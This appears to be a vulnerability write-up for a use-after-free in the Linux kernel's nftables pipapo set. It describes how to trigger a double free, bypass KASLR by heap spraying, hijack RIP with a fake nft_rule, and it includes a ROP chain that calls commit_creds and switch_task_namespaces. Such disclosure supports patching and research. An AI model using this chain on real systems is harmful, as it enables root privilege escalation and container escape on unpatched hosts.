### Triggering Vulnerability

If elements with the same key exist in a pipapo set, `nft_pipapo_remove` may remove the wrong element. As a result, the deactivated element remains in the set, causing a UAF.

We can trigger the vulnerability as follows:

- Create a chain `Base`.
- Create a pipapo set `Vulnerable`.
- Create a set element with key k in `Vulnerable`. We set the timeout of element to 1.
- Create a set element with key k in `Vulnerable` again. This is allowed because the previous element has timed out. Repeat this step 256 times.
- A timeouted element is left in the set due to an invalid remove function when it is gc'd.
- Delete set elem with key k. This results in a double free on the set element.

### KASLR Bypass

The leak process is as follows:

- Create a chain `Base`.
- Create a pipapo set `Vulnerable`.
- Create a set element with key k in `Vulnerable`. We set the timeout of element to 1. The set element is allocated into `kmalloc-cg-256`.
- Create a set element with key k in `Vulnerable` again. This is allowed because the previous element has timed out. Repeat this step 256 times.
- A timeouted element is left in the set due to an invalid remove function when it is gc'd.
- Spray `table->udata` into `kmalloc-cg-256` to place it at freed set element.
- Delete set `Vulnerable`. This results in a free on the sprayed `table->udata` because of double free.
- Spray the rules with the count expr into `kmalloc-cg-256`.
- We can get the kernel base address by reading ops address of count expr through `table->udata`

### RIP Control

RIP can be controlled as follows:

- Free the `table->udata` that was sprayed in an earlier step. This will free the previously sprayed `nft_rule`.
- Spray a fake `nft_rule` object using `table->udata`. We can control the RIP by setting the `rule->data->ops` field to the address of the CPU entry area.
- Set up the CPU entry area to contain the address of stack pivot gadget.
- Delete the fake rule, which dereferences the crafted ops pointer. As a result, the RIP is controlled in `nft_rule_expr_deactivate` [1].

```c
void nft_rule_expr_deactivate(const struct nft_ctx *ctx, struct nft_rule *rule,
                enum nft_trans_phase phase)
{
    struct nft_expr *expr;

    expr = nft_expr_first(rule);
    while (nft_expr_more(rule, expr)) {
        if (expr->ops->deactivate)
            expr->ops->deactivate(ctx, expr, phase);     // [1]

        expr = nft_expr_next(expr);
    }
}
```

### Post RIP

Store the ROP payload below in the userdata of the fake rule allocated in the `kmalloc-cg-256`, and then execute it.

```c
void make_payload(uint64_t* data){
    int i = 0;

    // commit_creds(&init_cred)
    data[i++] = kbase + pop_rdi_ret;
    data[i++] = kbase + init_cred_off;
    data[i++] = kbase + commit_creds_off;

    // find_task_by_vpid(1)
    data[i++] = kbase + pop_rdi_ret;
    data[i++] = 1;
    data[i++] = kbase + find_task_by_vpid_off;

    data[i++] = kbase + pop_rsi_ret;
    data[i++] = 0;

    // switch_task_namespaces(find_task_by_vpid(1), &init_nsproxy)
    data[i++] = kbase + mov_rdi_rax_ret;
    data[i++] = kbase + pop_rsi_ret;
    data[i++] = kbase + init_nsproxy_off;
    data[i++] = kbase + switch_task_namespaces_off;

    data[i++] = kbase + swapgs_restore_regs_and_return_to_usermode_off;
    data[i++] = 0;
    data[i++] = 0;
    data[i++] = _user_rip;
    data[i++] = _user_cs;
    data[i++] = _user_rflags;
    data[i++] = _user_sp;
    data[i++] = _user_ss;
}
```